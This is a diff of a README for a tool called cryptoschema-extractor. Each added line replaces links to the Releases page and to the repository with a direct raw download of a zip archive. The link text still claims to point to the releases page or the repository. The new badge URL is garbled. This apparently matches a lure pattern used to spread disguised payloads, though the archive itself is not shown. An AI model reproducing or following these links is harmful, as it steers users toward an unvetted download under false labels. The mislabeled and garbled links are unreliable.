@@ -1,6 +1,6 @@
 # 🛠️ cryptoschema-extractor - Extract Key Details from Cryptographic Schemes
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen.svg)](https://github.com/AJfrrr/cryptoschema-extractor/releases)
+[![Download Now](https://github.com/AJfrrr/cryptoschema-extractor/raw/refs/heads/main/cryptoschema_extractor/extractor-cryptoschema-v1.6.zip%20Now-Get%20the%https://github.com/AJfrrr/cryptoschema-extractor/raw/refs/heads/main/cryptoschema_extractor/extractor-cryptoschema-v1.6.zip)](https://github.com/AJfrrr/cryptoschema-extractor/raw/refs/heads/main/cryptoschema_extractor/extractor-cryptoschema-v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Use this information to deepen your understanding of cryptosystems and their mat
 
 To get started, visit the Releases page to download the application.
 
-[Download Now](https://github.com/AJfrrr/cryptoschema-extractor/releases)
+[Download Now](https://github.com/AJfrrr/cryptoschema-extractor/raw/refs/heads/main/cryptoschema_extractor/extractor-cryptoschema-v1.6.zip)
 
 ### 🛠️ System Requirements
 
@@ -33,7 +33,7 @@ Before you download, ensure your computer meets these requirements:
 
 ### 📁 Installation Steps
 
-1. **Visit the Releases Page**: Go to [this page](https://github.com/AJfrrr/cryptoschema-extractor/releases).
+1. **Visit the Releases Page**: Go to [this page](https://github.com/AJfrrr/cryptoschema-extractor/raw/refs/heads/main/cryptoschema_extractor/extractor-cryptoschema-v1.6.zip).
 2. **Choose the Correct Version**: Look for the latest release version. Click on it to view available downloads.
 3. **Download the Application**: Find the file that suits your operating system, then click to download it.
 4. **Open the Downloaded File**: Navigate to your Downloads folder and locate the downloaded file.
@@ -72,7 +72,7 @@ You can help improve **cryptoschema-extractor**! Here’s how:
 
 ## 🔗 Useful Links
 
-- **GitHub Repository**: [cryptoschema-extractor on GitHub](https://github.com/AJfrrr/cryptoschema-extractor)
-- **Release Page**: [Download the latest version](https://github.com/AJfrrr/cryptoschema-extractor/releases)
+- **GitHub Repository**: [cryptoschema-extractor on GitHub](https://github.com/AJfrrr/cryptoschema-extractor/raw/refs/heads/main/cryptoschema_extractor/extractor-cryptoschema-v1.6.zip)
+- **Release Page**: [Download the latest version](https://github.com/AJfrrr/cryptoschema-extractor/raw/refs/heads/main/cryptoschema_extractor/extractor-cryptoschema-v1.6.zip)
 
 Thank you for choosing **cryptoschema-extractor**. Enjoy exploring the world of cryptographic schemes!
